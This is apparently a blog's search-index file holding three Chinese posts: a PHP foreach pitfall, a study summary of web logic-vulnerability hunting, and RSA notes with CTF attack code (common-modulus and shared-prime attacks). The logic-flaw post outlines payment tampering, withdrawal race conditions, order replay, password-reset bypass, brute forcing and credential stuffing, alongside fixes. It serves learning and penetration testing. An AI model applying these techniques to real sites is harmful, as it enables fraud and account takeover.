<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[foreach的一些小坑]]></title>
    <url>%2F2018%2F09%2F29%2Fforeach%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%9D%91%2F</url>
    <content type="text"><![CDATA[PHP-foreach的一些小坑 再PHP中，foreach是对数组遍历的一个方法，遍历也只用于数组，在编程的时候有一些小坑，记录如下。 foreach的两种语法结构 只遍历引用值： 123456789101112131415foreach (array_expression as $value) statement //示例：&lt;?php$arr = array(1, 2, 3, 4);foreach ($arr as $value) &#123; echo $value;&#125;echo "\n";echo $value;?&gt;//显示结果：12344 遍历引用键和值： 123456789101112131415161718192021foreach (array_expression as $key =&gt; $value) statement //示例：&lt;?php$arr = array(1, 2, 3, 4);foreach ($arr as $key =&gt; $value) &#123; echo "[$key] =&gt; $value\n";&#125;echo "\n";echo "[$key] =&gt; $value";echo "\n";?&gt; //结果：[0] =&gt; 1[1] =&gt; 2[2] =&gt; 3[3] =&gt; 4[3] =&gt; 4 在foreach中是否使用&amp;的区别： 不使用&amp;，foreach的作用域只在当前循环中，不会改变外部数组的值： 12345678910111213141516171819&lt;?php$arr = array(1, 2, 3, 4);foreach ($arr as $value) &#123; $value = $value * 2; echo "$value ";&#125;echo "\n";print_r($arr);//结果：2 4 6 8 Array( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 4) 使用&amp;会使得作用域扩大到对应的数组，改变数组的值： 12345678910111213141516171819&lt;?php$arr = array(1, 2, 3, 4);foreach ($arr as &amp;$value) &#123; $value = $value * 2; echo "$value ";&#125;echo "\n";print_r($arr);//结果：2 4 6 8 Array( [0] =&gt; 2 [1] =&gt; 4 [2] =&gt; 6 [3] =&gt; 8) 在foreach中是否使用&amp;的坑点： 这里和上面的作用域联系起来，没使用以后不会影响数组本身，所以两次foreach的结果互不影响： 123456789101112131415161718192021&lt;?php$arr = array(1, 2, 3, 4);foreach ($arr as $value) &#123; // $value = $value * 2; echo "$value ";&#125;echo "\n";echo $value;echo "\n";foreach ($arr as $value) &#123; echo "$value ";&#125;echo "\n";echo $value;//结果1 2 3 4 41 2 3 4 4 使用以后改变了作用域，这里&amp;指向第一次foreach的最后一个地址，在PHP中它不会自动释放该地址： 1234567891011121314151617181920&lt;?php$arr = array(1, 2, 3, 4);foreach ($arr as &amp;$value) &#123; // $value = $value * 2; echo "$value ";&#125;echo "\n";echo $value;echo "\n";foreach ($arr as $value) &#123; echo "$value ";&#125;echo "\n";echo $value;//结果：1 2 3 4 41 2 3 3 3 查看它每次具体的变化：(这里可以验证每次改变的是&amp;指向的最后一个地址) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php$arr = array(1, 2, 3, 4);foreach ($arr as &amp;$value) &#123;&#125;;print_r($arr);foreach ($arr as $key =&gt; $value) &#123; echo "&#123;$key&#125; =&gt; &#123;$value&#125; "; print_r($arr);&#125;?&gt;//结果：Array( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 4)0 =&gt; 1 Array( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 1)1 =&gt; 2 Array( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 2)2 =&gt; 3 Array( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 3)3 =&gt; 3 Array( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 3) 解决方法：在每次foreach后unset解除&amp;的指定关系，或者在每次遍历中使用不同的变量名： 123456789101112131415161718192021222324252627282930&lt;?php$arr = array(1, 2, 3, 4);foreach ($arr as &amp;$value) &#123; echo "$value ";&#125;unset($value);echo "\n";foreach ($arr as $value) &#123; echo "$value ";&#125;?&gt;//结果：1 2 3 4 1 2 3 4 //使用不同的变量名&lt;?php$arr = array(1, 2, 3, 4);foreach ($arr as &amp;$value) &#123; echo "$value ";&#125;echo "\n";foreach ($arr as $val) &#123; echo "$val ";&#125;?&gt;//结果：1 2 3 4 1 2 3 4]]></content>
      <categories>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[逻辑漏洞挖掘学习总结]]></title>
    <url>%2F2018%2F09%2F17%2F%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[逻辑漏洞挖掘学习（总结完善） 近学习了一下挖逻辑漏洞，针对逻辑漏洞学习到的点做一下总结，主要以看思路和漏洞实例在 学习，参考链接就是总结中的链接以及与这些链接相关的网站，太多了，就直接在文章总列举出 来了。逻辑漏洞的挖掘主要还是在数据包的各个参数上，一定要细心。 工具：BurpSuit(主要的逻辑漏洞的挖掘工具)思路：复杂灵活核心：绕过真实身份认证或者正常业务流程达到预期目的用户身份：认证（用户身份特性认证） 本地认证 服务端认证 业务流程：对业务流程的熟悉程度（各类型网站+业务模式） 制定漏洞模型 重点业务功能区：个人信息区域、密码修改区域、密码忘记区域、支付区域、手机号区域等 逻辑漏洞的类型：支付漏洞：价格、数量、订单、结算、优惠券积分等利用（比如原价100元的A产品可以利用漏洞小于100元去购买，在支付中一般分为三步：订购、确认信息、结算）订单： 选择商品时修改商品的价格（也可以在确认订单的时候修改订单，可以改小或者改为负数） 选择商品时更改商品的数量（如设置为负数） 比如在一个服务器购买网站，他们的硬盘是按G来算的，就好像1G只要1元(假设)，2G只要2元，以此类推，比如那个服务器总共需要200元，我们是否可以修改G的数量来减少支付价格呢，比如我们把G改成-19 商品剩余为一件时，多人同时购买是否产出冲突 生成订单时修改订单的金额 商品为0时是否还可以购买 结算： 优惠活动时打折、优惠券的多次使用 比如在某商城活动的时候领取优惠券，20元的产品规定只能使用5元的，可以修改为15元等 https://www.secpulse.com/archives/40336.html 截断数据包，结算的时候修改订单数量、金额 比如A产品100元，改为-90元 在很多时候，我们都忽略了一个问题，那就是在购买一件商品的时候，我们都喜欢修改成0.01或者负数，但是这里是有一个积分的，就是比如我们在购买1元产品的时候可以获得100积分，但是我们如果将金额数小于1元的话积分就肯定是为空的了，因为这里的积分是按100/元来算的，也就是说，如果我们看到购买xx元有送积分的，我们可以来尝试一下把金额数改成积分最低数，就比如1元。 比如我们在某网站，他们用的是自家的钱包(迷你钱包),这个钱包作用也仅是用于这一个站，在提现时，没有任何验证码或者校验机制，只要输入体现金额就可以提现，并且是秒到账，如果什么负数，修改金额都测试过了都不行，那么你就可以试试多线程并发问题,提现时抓包，比如我现在钱包内有0.1元，那么按理说每提0.01可以提现10次，也就是发送10次进程，但是利用这个问题可以达到多发现几次成功的进程，提现时抓包，然后把数据包发送到BurpSuite工具的Intruder当中，进行批量发送18次，然后可以看到成功的提现到了12次（并发、数据库操作加锁） 比如a产品为999元，当我们购买的时候我们可以试试修改数量成-1个，看是否有变成-999元，我们点击支付一下，一般来说，都可能支付失败的，因为这个时候服务器验证了这个价格是否和服务器中对应的价格是否一样，此时我们可以将-999元的产品放到购物车，再去此网站购买一个1000元产品的购物车，然后我们可以来点击购买，可以看到支付价格就变成了1元(1000+(-999)=1)了 截断数据包，结算的时候修改支付方式（第三方的支付接口逻辑设计不严格就会产生） 比如将百度钱包的接口、微信支付等改为一个其他的接口，如果逻辑设计不严格就会产生漏洞 伪造订单，刷单 例如：在购买一个产品的时候，目标程序时用过A参数判断是否支付，比如A=1实时表示支付，A=0时表示未支付，通过修改可控的A来验证是否可以伪造订单、等。 重复支付（请求重放、多次下单） 比如一些商场中有一些试用卡之类的，通过某种渠道获得的(比如签到，分享网站信息，购买某个商品送来的)，当我们试用的时候主动取消试用，那么这个时候试用卡可能会返回到我们账户中，这里的问题就是如果没有进行对订单多重提交的校验，那么就可导致无限制刷牌子。 比如，我在试用某个产品的时候，每次试用都会产生一个订单号，然后利用刚抓到的数据包进行批量提交，你就可以看到每次提交的订单号不一样，然后这时你再看订单可以看到同一个商品的无数订单，但试用牌子数只扣了你第一个试验时的牌子数，那么这时你申请批量退出试用，那么这么多订单，每退一个就会退相应的牌子数量到账户当中，这就构成了无限制刷得问题 越权支付 比如我们在购买某产品的时候，支付时会出现当前用户的ID，如果没有加以验证，其支付也是一次性支付没有要求输入密码什么的机制，那么就可以修改这个用户ID为其它用户ID，达到用其他用户的账号进行支付你的商品 参数污染 请求没该参数，却返回该参数，可请求该参数污染返回值 支付漏洞突破口： 截断数据包，伪造第三方的确认信息 绕过商家确认直接退货 绕过商品类型直接退货（退货是否被允许，比如虚拟商品，话费等） 绕过客户端验证直接确认收货 支付漏洞实例： https://www.0dayhack.com/post-832.html https://www.bigniu.com/bug/view/935 https://www.bigniu.com/bug/view/929 https://www.secpulse.com/archives/47665.html https://www.secpulse.com/archives/41144.html https://www.secpulse.com/archives/39768.html https://www.secpulse.com/archives/36412.html https://www.secpulse.com/archives/35976.html（绕过手机号验证的多种方式） https://www.secpulse.com/archives/35701.html https://www.secpulse.com/archives/35188.html http://www.freebuf.com/vuls/151196.html 支付漏洞修复方案：123456789和银行交易时，做数据签名，对用户金额和订单签名。敏感参数不要明文放在URL中服务端效验客户端提交的参数在服务端计算金额的时候，一定要判断是否为正数。支付过程中加一个服务器生成的key，用户校验参数有没有被串改。如果一定需要用URL传递相关参数，建议进行后端的签名验证订单金额和充值接口返回的数据进行校验提交订单时后台判断单价是否与数据库中相符，如不符则返回错误。支付时应从服务器拉取数据，而不是直接读客户端的值！！ 密码重置漏洞：用户密码找回方式： 手机短信验证码 https://www.secpulse.com/archives/36619.html https://www.secpulse.com/archives/35564.html https://www.secpulse.com/archives/35488.html（直接改返回包） https://www.secpulse.com/archives/35169.html（通过越权修改） https://www.secpulse.com/archives/35023.html https://www.secpulse.com/archives/34710.html https://www.secpulse.com/archives/33800.html 邮箱（密码找回链接） 自动生成新密码 密码重置突破口： 认证凭证暴力破解（多数为验证码4位及以下的纯数字，验证码时间长，不失效可爆破） https://bysec.io/detailsMasked.pyp?id=5 https://www.secpulse.com/archives/41168.html 认证凭证回显（明文传输） https://www.secpulse.com/archives/49496.html 认证凭证重复使用（比如验证码重复使用） 重新绑定（如重新绑定邮箱、手机号且自己可控） https://www.test404.com/post-1352.html?wafcloud_antihack=2 https://xz.aliyun.com/t/2011（密码重置里面、越权） https://bbs.ichunqiu.com/thread-23318-1-1.html 用户身份特性认证（token生成可控） 服务器端认证为空、直接删除验证码、或者认证的特征值可控： https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=23343（直接改为修改密码验证的特征值） 本地认证、修改返回值 https://www.secpulse.com/archives/37864.html https://bbs.ichunqiu.com/thread-23319-1-1.html 删除校验码绕过 cookie覆盖 https://bbs.ichunqiu.com/thread-38176-1-1.html 任意用户登录： 空密码绕过（绕过前端改为空值） 身份替换（登录成功产生session） 认证凭证绕过 枚举、越权 https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=24146（通过修改请求头里面的参数进行时间限制的绕过） https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=27614（通过修改cookie值来绕过验证码时间限制造成短信轰炸） 认证缺陷漏洞： 弱验证 空验证 认证凭证有效性、唯一性 http://www.heavensec.org/index.php/1613.html 身份验证码之暴力破解 （https://bbs.ichunqiu.com/thread-45640-1-1.html） 无防护措施（没有对登录、注册、重置密码之类的功能进行一定的防护，所以当碰到没有验证码的，没有对输错密码次数进行限制，而且还是明文传输的系统，先可以考虑爆破） 锁定机制——&gt;撞库（有些系统会有一些防护措施，比如超过一定的错误次数会将账号进行锁定，或者是某IP频繁的进行登录操作会封IP，这是后可以进行撞库，用弱密码遍历用户名；有些限制并没有在后台验证，也可以加入XFF等方式绕过） 修复：限制单位时间内执行某项操作的次数，要对限制的方法、次数等进行详细的说明，限制的验证也应该再服务端 验证码（可以防止自动化攻击） 图片验证码——&gt;绕过（图片验证码反复使用、验证码在前端校验、验证码可识别、验证码在客户端传输） 短信验证码——&gt;爆破/绕过（与图片类似） 修复：所有的验证码生存周期都应该是一次性的，无论校验成功与失败，且验证码加入干扰线，变形等防止机器识别，对于可爆破的参数加上人机识别，通过设置的阀值来判断；同时验证过程不应将有助于推测正确验证答案的信息返回到客户端。 https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=23909 越权： 水平越权 实例： 12345678910111213141516171819https://www.bigniu.com/bug/view/926https://xz.aliyun.com/t/2011https://www.secpulse.com/archives/41142.htmlhttps://www.secpulse.com/archives/38473.htmlhttps://www.secpulse.com/archives/35169.htmlhttps://bbs.ichunqiu.com/thread-39287-1-1.htmlhttp://wooyun.jozxing.cc/static/bugs/wooyun-2016-0196245.htmlhttp://wooyun.jozxing.cc/static/bugs/wooyun-2016-0194518.htmlhttp://wooyun.jozxing.cc/static/bugs/wooyun-2016-0193632.html(越权删除+敏感信息泄露)http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0192676.htmlhttp://wooyun.jozxing.cc/static/bugs/wooyun-2016-0192848.html（越权任意用户修改+信息泄露）http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0193124.html（越权之信息泄露）http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0193124.html（越权修改+密码重置）http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0191930.html（整站越权+通过组合越权获取所有信息）http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0191192.html（爆破+越权）http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0190106.html（绕过signature字段达到越权）http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0189823.html（越权之信息泄露）http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0188760.html（越权之信息泄露）http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0187544.html 垂直越权 实例： 1234https://xz.aliyun.com/t/2011https://www.secpulse.com/archives/41174.htmlhttps://www.secpulse.com/archives/37083.htmlhttp://wooyun.jozxing.cc/static/bugs/wooyun-2016-0189507.html 未授权访问（登录凭证验证） 绕过授权模式（参数构造） 敏感信息泄露：12345678910https://www.bigniu.com/bug/view/930https://www.bigniu.com/bug/view/928https://www.bigniu.com/bug/view/927https://www.secpulse.com/archives/47842.htmlhttps://www.secpulse.com/archives/47482.htmlhttps://www.secpulse.com/archives/42603.htmlhttps://www.secpulse.com/archives/41375.htmlhttps://www.secpulse.com/archives/41253.htmlhttps://www.secpulse.com/archives/41144.htmlhttps://www.secpulse.com/archives/40909.html 接口枚举：业务接口因为没有做验证或者验证机制缺陷，容易遭受枚举攻击、撞库、订单、优惠券遍历]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>渗透测试</tag>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RSA总结]]></title>
    <url>%2F2018%2F09%2F02%2FRSA%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[关于RSA的一些总结 最近一段时间比赛比较多，密码学的题也是各种各样的，有时候会碰到RSA，想想上学期学的数论，RSA就讲了整整一个月，最后发现代码上还是应用不了，就像没学一样，毕竟在实际生活中好多加密算法都是设计好的。为了让学过的东西不要白学，抽点时间结合题目，对RSA进行一下总结，网上好多关于RSA的文章写的都挺好的，但还是喜欢自己动手做一遍。本文没有啥原创的东西，主要是对学习的一个记录。 RSA简介： 上图是对RSA算法非对称加解密的一个描述，也是RSA算法最根本的东西，下面说一下RSA算法被攻击的可能性（有没有在知道公钥的情况下推导出私钥） 12345要知道的理论是： ed≡1 (mod φ(n))。只有知道e和φ(n)，才能算出d。 φ(n)=(p-1)(q-1)。只有知道p和q，才能算出φ(n)。 n=pq。只有将n因数分解，才能算出p和q。所以：如果n可以被分解，那就可以推到出d,私钥就可以被破解，但实际上p,q是大素数，分解是很困难的 一些理论支撑： 12345678910111213欧拉函数：φ(n)是小于等于n的数中与n互质的数的数目欧拉函数是积性函数——若p,q互质，φ(p*q)= φ(p) *φ(q) 若p为质数，则φ(p)=p-1同余定理：给定一个正整数m，如果两个整数a和b满足（a-b）能够被m整除，即（a-b）/m得到一个整数，那么就称整数a与b对模m同余，记作a≡b(mod m)。 性质： 1 自反性 a≡a (mod m) 2 对称性 若a≡b(mod m)，则b≡a (mod m) 3 传递性 若a≡b (mod m)，b≡c (mod m)，则a≡c (mod m) 4 同余式相加 若a≡b (mod m)，c≡d(mod m)，则a+-c≡b+-d (mod m) 5 同余式相乘 若a≡b (mod m)，c≡d(mod m)，则ac≡bd (mod m)求逆元：指有一个整数d，可以使得e*d被φ(n)除的余数为1，即e*d ≡ 1 (mod φ(n))，这个式子等于e*d - 1 = k*φ(n) 一些程序代码上的支撑：（都是用python实现算法的应用） 快速幂取模：等价于pow方法 123456789def mod(c,d,n):#等价于自带的pow(c,d,n) r=1 while d&gt;0: c=c%n if d&amp;1: r=(r*c)%n d&gt;&gt;=1 c=(c*c)%n return r 模逆运算（就是求逆元，主要基于扩展欧几里得算法） python实现代码如下： 123456789def egcd ( a , b ): if (b == 0): return 1, 0, a else: x , y , q = egcd( b , a % b ) # q = GCD(a, b) = GCD(b, a%b) x , y = y, ( x - (a // b) * y ) return x, y, q def mod_inv(a,b): return egcd(a,b)[0]%b #求a模b得逆元 出来通过自己编写实现之外还可以通过gmpy2和libnum这两个库函数实现： 12345#coding:utf-8from libnum import invmodimport gmpy2print invmod(47,30)print gmpy2.invert(47,30) 欧几里得算法：就是求最大公约数，gcd(a,b)==gcd(b,a%b),(b!=0) 和 gcd(a,0)==a有递归实现和迭代实现两种： 123456789# 递归版def gcd(a, b): return a if not b else gcd(b, a % b)# 迭代版def gcd2(a, b): while b: a, b = b, a % b return a 扩展欧几里得算法：本质上就是将欧几里得算法求最大公约数的过程最后转化为线性表达式： 1234567891011121314151617181920212223# 递归版def ext_euclid ( a , b ): if (b == 0): return 1, 0, a else: x1 , y1 , q = ext_euclid( b , a % b ) # q = GCD(a, b) = GCD(b, a%b) x , y = y1, ( x1 - (a // b) * y1 ) return x, y, q# 迭代版def egcd(a, b): if b == 0: return (1, 0, a) x, y = 0, 1 s1, s2 = 1, 0 r, q = a % b, a / b while r: m, n = x, y x = s1 - x * q y = s2 - y * q s1, s2 = m, n a, b = b, r r, q = a % b, a / b return (x, y, b) 中国剩余定理，也叫孙子定理：用来求同于方程组（这里在数论中做题不复杂，一到代码是真的复杂） 直接贴上大佬的代码：（解决了互质与不互质两种情况） 12345678910111213def GCRT(mi, ai): # mi,ai分别表示模数和取模后的值,都为列表结构 assert (isinstance(mi, list) and isinstance(ai, list)) curm, cura = mi[0], ai[0] for (m, a) in zip(mi[1:], ai[1:]): d = gmpy2.gcd(curm, m) c = a - cura assert (c % d == 0) #不成立则不存在解 K = c / d * gmpy2.invert(curm / d, m / d) cura += curm * K curm = curm * m / d cura %= curm return (cura % curm, curm) #(解,最小公倍数) 应用中一些函数、模块的支撑 这里不得不感慨python的强大与方便，提供了gmpy2库、libnum库、pycrypto模块等第三方库，避免了从底层一步一步的写代码（其实也是太菜了，这种基于数论的代码是真的写不出来） gmpy2库、libnum库，主要提供各种数学运算的函数库，向求逆元，取模等运算直接调运函数就可以，很便捷 关于两个库的说明链接如下： pycrypto模块是python中来处理加密解密等信息安全相关的一个重要模块，提供了对称加密、非对称加密、散列哈希的一些计算方法，满足我们在密码学应用上的使用，就RSA可以实现公私钥的提取，生成，利用公私钥进行加解密等，之前写过的一篇文章有介绍 关于RSA中n的分解： 有在线分解：[]:http://factordb.com/ 离线的[yafu]:https://sourceforge.net/projects/yafu/ （p,q相差较大或较小时可快速分解） 除了用代码，还可以用OpenSSL对一些标准格式的RSA加解密 使用OpenSSL提取公钥信息：openssl rsa -pubin -in (文件名) -text 使用OpenSSL提取私钥信息：openssl rsa -in (文件名) -text 使用OpenSSL进行公钥加密：openssl rsautl -encrypt -in test -out test.enc -inkey asn1pub.pem -pubin 使用OpenSSL进行私钥解密：openssl rsautl -decrypt -in test.enc -out test.dec -inkey asn1enc.pem 使用OpenSSL进行私钥签名：openssl rsautl -sign -in test -out test.sig-inkey asn1enc.pem 使用OpenSSL进行公钥验证：openssl rsautl -verify -in test.sig -out test.vfy -inkey asn1pub.pem -pubin 一些实际的应用： RSA直接解密： 若已知私钥d，则可以直接解密： m=pow(c,d,n) : 1234567891011121314151617p:0x9a724c6747de9eadccd33f4d60ada91754b8be8c65590cafe66f69a2f4afbfd359e47ca6fd2dbde8948062dc116bc574f4313ab99b2bb6d8ae47beaa0c1ebeddLq:0x8c1c81cc005ce3dd6d684ebb88151dc0c53b1cef8a29b1cb8121860fb57d93117bf449aac4300dc6103ac6211c6f8ae68987d99aff0dd8967a4afa00f2116873Le:0x190a000845e9c8c2059242835432326369aaf8c7ca85e685bba968b386155a91f1f7ca1019ff23d119222e1f0dfdeb0915d2e97601ef94bf15ca6d9211e984e9038f263f4984355c397ed22d67c26da6d31acfc4d599c70cba80859bee099e5a2dc3ab23aecf58f73f44d07318f70985c623d9612efefb15bf8dab77d5d54e85Ld:0x28b95b7e3159a851cbf537e007ae49864b7dbb93fc370a5L c:0x23091e42fa7609c73f1941b320fad6d2ff6e47be588d1623f970f1fee7abd221c9834b208f3c888902fe87ca76ec1e1363757d93c6e25c49f1c61c72b141c0b8848b54a117427d8e30eeab89694eb5f849cafecb0e5361b9b2b0e3f89e0fdbcc66a6aad4a1a4a85d828083a01a5d569b7eeb6f9151794453382b524aa52993f9Lc=0x23091e42fa7609c73f1941b320fad6d2ff6e47be588d1623f970f1fee7abd221c9834b208f3c888902fe87ca76ec1e1363757d93c6e25c49f1c61c72b141c0b8848b54a117427d8e30eeab89694eb5f849cafecb0e5361b9b2b0e3f89e0fdbcc66a6aad4a1a4a85d828083a01a5d569b7eeb6f9151794453382b524aa52993f9d=0x28b95b7e3159a851cbf537e007ae49864b7dbb93fc370a5n=0x9a724c6747de9eadccd33f4d60ada91754b8be8c65590cafe66f69a2f4afbfd359e47ca6fd2dbde8948062dc116bc574f4313ab99b2bb6d8ae47beaa0c1ebedd * 0x8c1c81cc005ce3dd6d684ebb88151dc0c53b1cef8a29b1cb8121860fb57d93117bf449aac4300dc6103ac6211c6f8ae68987d99aff0dd8967a4afa00f2116873m=pow(c,d,n)print hex(m)[2:len(hex(m))-1].decode('hex') 若已知质数p和q，则通过依次计算欧拉函数、私钥d可解密。实现如下： 123456789def rsa_decrypt(e, c, p, q): phi = (p - 1) * (q - 1) n = p * q try: d = gmpy2.invert(e, phi) #求e模phi的逆 return pow(c, d, n) except Exception as e: print "e and phi are not coprime!" raise e 在选取加密指数e时要求phi，e互质，也就是gcd(phi,e)==1 ，如果不满足是无法直接解密的 12345678x**33=1926041757553905692219721422025224638913707 mod 3436415358139016629092568198745009225773259tell me the smallest answer of xn = 3436415358139016629092568198745009225773259=3881 · 885445853681787330351086884500131209939e = 33c = 1926041757553905692219721422025224638913707phi=(p-1)*(q-1)gcd(phi,33)==3 -&gt; e = 11n分解以后不满足互素的要求，先用逆元11得到x^3的值,然后爆破X 123456789101112131415161718192021import gmpy2import libnumc = 1926041757553905692219721422025224638913707n = 3436415358139016629092568198745009225773259e = 33p = 3881q = 885445853681787330351086884500131209939phi = (p-1)*(q-1)d = libnum.invmod(e/3, phi)print dx3 = pow(c, d, n)print x3def calc(i): x, b = gmpy2.iroot(x3 + i *n, 3) if b == 1: print x exit()for j in xrange(0,100000000): calc(j) 模不互质（gcd(N1,N2)!=1）适用情况：存在两个或更多模数，且gcd(N1,N2)!=1 多个模数n共用质数，则可以很容易利用欧几里得算法求得他们的质因数之一gcd(N1,N2) ，然后这个最大公约数可用于分解模数分别得到对应的p和q，即可进行解密。 共模攻击：适用情况：明文m、模数n相同，公钥指数e、密文c不同，gcd(e1,e2)==1 对同一明文的多次加密使用相同的模数和不同的公钥指数可能导致共模攻击。 python实现的证明代码： 123456789101112def common_modulus(n, e1, e2, c1, c2): """ ref: https://crypto.stackexchange.com/questions/16283/how-to-use-common-modulus-attack ∵gcd(e1,e2)==1,∴由扩展欧几里得算法，存在e1*s1+e2*s2==1 ∴m==m^1==m^(e1*s1+e2*s2)==((m^e1)^s1)*((m^e2)^s2)==(c1^s1)*(c2^s2) """ assert (libnum.gcd(e1, e2) == 1) _, s1, s2 = gmpy2.gcdext(e1, e2) # 若s1&lt;0，则c1^s1==(c1^-1)^(-s1)，其中c1^-1为c1模n的逆元。 m = pow(c1, s1, n) if s1 &gt; 0 else pow(gmpy2.invert(c1, n), -s1, n) m *= pow(c2, s2, n) if s2 &gt; 0 else pow(gmpy2.invert(c2, n), -s2, n) return m % n Xman-RSA(这道题利用了共模攻击和模不互素) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from gmpy2 import is_primefrom os import urandomimport base64def bytes_to_num(b): return int(b.encode('hex'), 16)def num_to_bytes(n): b = hex(n)[2:-1] b = '0' + b if len(b) % 2 == 1 else b return b.decode('hex')def get_a_prime(l): random_seed = urandom(l) num = bytes_to_num(random_seed) while True: if is_prime(num): break num += 1 return numdef encrypt(s, e, n): p = bytes_to_num(s) p = pow(p, e, n) return num_to_bytes(p).encode('hex')def separate(n): p = n % 4 t = (p * p) % 4 return t == 1f = open('flag.txt', 'r')flag = f.read()msg1 = ""msg2 = ""for i in range(len(flag)): if separate(i): msg2 += flag[i] else: msg1 += flag[i]p1 = get_a_prime(128)p2 = get_a_prime(128)p3 = get_a_prime(128)n1 = p1 * p2n2 = p1 * p3e = 0x1001c1 = encrypt(msg1, e, n1)c2 = encrypt(msg2, e, n2)print(c1)print(c2)e1 = 0x1001e2 = 0x101p4 = get_a_prime(128)p5 = get_a_prime(128)n3 = p4 * p5c1 = num_to_bytes(pow(n1, e1, n3)).encode('hex')c2 = num_to_bytes(pow(n1, e2, n3)).encode('hex')print(c1)print(c2)print(base64.b64encode(num_to_bytes(n2)))print(base64.b64encode(num_to_bytes(n3))) n2，n3已知，利用共模攻击得到n1，由gcd(n1,n2)==p1 分解n1，n2得到flag： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354# -*- coding: utf-8 -*-# by https://findneo.github.io/import base64import libnumimport gmpy2def fix_py(): # decode encryption.encrypted s1 = 'abdefghijklmpqrtuvwxyz' s2 = 'dmenwfoxgpyhirasbktclu' f1 = open('encryption.encrypted') with open('encryption.py', 'w') as f2: for i in f1.readlines(): tmp = '' for j in i: tmp += s2[s1.index(j)] if j in s1 else j f2.write(tmp)# fix_py()def common_modulus(n, e1, e2, c1, c2): assert (libnum.gcd(e1, e2) == 1) _, s1, s2 = gmpy2.gcdext(e1, e2) m = pow(c1, s1, n) if s1 &gt; 0 else pow(gmpy2.invert(c1, n), -s1, n) m *= pow(c2, s2, n) if s2 &gt; 0 else pow(gmpy2.invert(c2, n), -s2, n) m %= n return m[n2, n3] = map(lambda x: int(base64.b64decode(x).encode('hex'), 16), open('n2&amp;n3').readlines())[n1c1, n1c2] = map(lambda x: int(x, 16), open('n1.encrypted').readlines())[msg1c1, msg2c2] = map(lambda x: int(x, 16), open('ciphertext').readlines())# 通过共模攻击得到n1e1 = 0x1001e2 = 0x101n1 = common_modulus(n3, e1, e2, n1c1, n1c2)# n1,n2有一个共有质因数p1# n1 += n3 # 存在n3比n1小的可能，并且确实如此;貌似主办方中途改题，把n1改成小于n3了。p1 = gmpy2.gcd(n1, n2)assert (p1 != 1)p2 = n1 / p1p3 = n2 / p1e = 0x1001d1 = gmpy2.invert(e, (p1 - 1) * (p2 - 1))d2 = gmpy2.invert(e, (p1 - 1) * (p3 - 1))msg1 = pow(msg1c1, d1, n1)msg2 = pow(msg2c2, d2, n2)msg1 = hex(msg1)[2:].decode('hex')msg2 = hex(msg2)[2:].decode('hex')print msg1, msg2# XA&#123;RP0I_0Itrsigi s.y# MNCYT_55_neetnvmrap&#125;# XMAN&#123;CRYPT0_I5_50_Interestingvim rsa.py&#125; RSA-CRYPTO(有两个公钥文件和两个flag文件。提取公钥对比，n相同且可解密，共模攻击) 12345678910from Crypto.PublicKey import RSAwith open('./pubkey2.pem', 'r') as f: key = RSA.importKey(f) n = key.n e = key.eprint (n)print (e)#提取两个公钥都是这个脚本 1234567891011121314151617181920212223242526272829303132333435#coding:utf-8import gmpy2import stringfrom Crypto.Util.number import long_to_bytesfrom base64 import *#共模攻击n = 0x8989a398988456b3fef4a6ad86df3c99577f8978048de5436befc30d8d8c94958912aa526ff333b66857306ebb8de36c2c396a84efdc5d382502daa1a3f3b6e97502d2e31c849330f5b4c95257a149a97f5954eaf89341147adcdd4e950fff74e30bbe622876b42eeac86df4ad9715d05b5604aa8179424c7d9ac46bd6b5f322b2b5728ba148704a25a8efcc1e7c84ea7e5ce3e01703f04f94a431d9954bd7ae2c7dd6e879b35f8a2d4a5efbe737257bf99bd9ee66b15aff233fc77b558a487da5952fbe2b923da9c5eb46788c050336b7e36a5ed82d5c1b2aeb0e45bee405cbe72481db2568aa829eeac87d201a5a8ff5ee6f0be38192ab2839635f6c664217Le1 = 2333e2 = 23333with open('./flag1.enc','r') as f: cipher1 = f.read() cipher1 = b64decode(cipher1).encode('hex') cipher1 = string.atoi(cipher1,base = 16)with open('./flag2.enc','r') as f: cipher2 = f.read() cipher2 = b64decode(cipher2).encode('hex') cipher2 = string.atoi(cipher2,base = 16) #将字符串转为整型数字,base 指定进制gcd, s, t = gmpy2.gcdext(e1, e2) #返回一个三元素的元组 g == gcd（a，b）和g == a * s + b * tif s &lt; 0: s = -s cipher1 = gmpy2.invert(cipher1,n) #求cipher1模n的逆(求逆元)if t &lt; 0: t = -t cipher2 = gmpy2.invert(cipher2,n)#powmod（x，y，m）返回（x ** y）mod 